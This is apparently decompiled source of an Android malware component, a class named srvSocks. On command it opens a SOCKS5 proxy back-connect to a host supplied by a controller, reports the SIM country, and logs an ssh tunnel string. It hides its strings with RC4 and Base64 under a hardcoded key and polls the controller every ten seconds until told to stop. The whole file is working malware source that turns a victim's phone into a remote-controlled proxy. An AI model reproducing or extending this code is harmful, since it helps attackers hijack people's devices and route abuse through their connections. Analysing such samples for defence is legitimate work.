/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.content.Context
 *  android.content.Intent
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvSocks$SocketRunnable;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import java.io.File;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

public class srvSocks
extends IntentService {
    utils missions$ = new utils();
    constants monster$ = new constants();

    public srvSocks() {
        super("");
    }

    public final String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onHandleIntent(Intent object) {
        this.missions$.SettingsWrite((Context)this, "S5", "");
        String string = utils.countrySIM((Context)this);
        Object object2 = string;
        if (string.length() != 2) {
            object2 = Locale.getDefault().getCountry().toLowerCase();
        }
        string = object.getStringExtra("host");
        String string2 = object.getStringExtra("user");
        CharSequence charSequence = object.getStringExtra("pass");
        object = object.getStringExtra("port");
        if (!this.missions$._markers((Context)this, this.missions$.SettingsRead((Context)this, "QQ"), (String)object2, string, (String)object, string2, (String)charSequence).equals("+")) {
            object2 = new StringBuilder();
            ((StringBuilder)object2).append("Socks connection to server ");
            ((StringBuilder)object2).append(string);
            ((StringBuilder)object2).append(" is not possible, port ");
            ((StringBuilder)object2).append((String)object);
            ((StringBuilder)object2).append(" is busy[143523#]");
            object = ((StringBuilder)object2).toString();
            this.missions$.SettingsToAdd((Context)this, "AS", (String)object);
            this.missions$._compiled((Context)this, this.missions$.SettingsRead((Context)this, "QQ"));
            this.stopSelf();
            return;
        }
        object2 = new Thread(new srvSocks$SocketRunnable(this));
        ((Thread)object2).start();
        utils utils3 = this.missions$;
        this.getDir("apk", 0);
        this.missions$.Log("START", "START SOCKS");
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append("Socks5: ssh -L ");
        ((StringBuilder)charSequence).append((String)object);
        ((StringBuilder)charSequence).append(":127.0.0.1:");
        ((StringBuilder)charSequence).append((String)object);
        ((StringBuilder)charSequence).append(" ");
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append("@");
        ((StringBuilder)charSequence).append(string);
        ((StringBuilder)charSequence).append("[143523#]");
        object = ((StringBuilder)charSequence).toString();
        this.missions$.SettingsToAdd((Context)this, "AS", (String)object);
        this.missions$._compiled((Context)this, this.missions$.SettingsRead((Context)this, "QQ"));
        do {
            TimeUnit.MILLISECONDS.sleep(10000L);
            this.missions$.sendAddSocks5((Context)this, this.missions$.SettingsRead((Context)this, "QQ"));
        } while (!this.missions$.SettingsRead((Context)this, "S5").equals("stop"));
        ((Thread)object2).interrupt();
        this.stopSelf();
    }
}

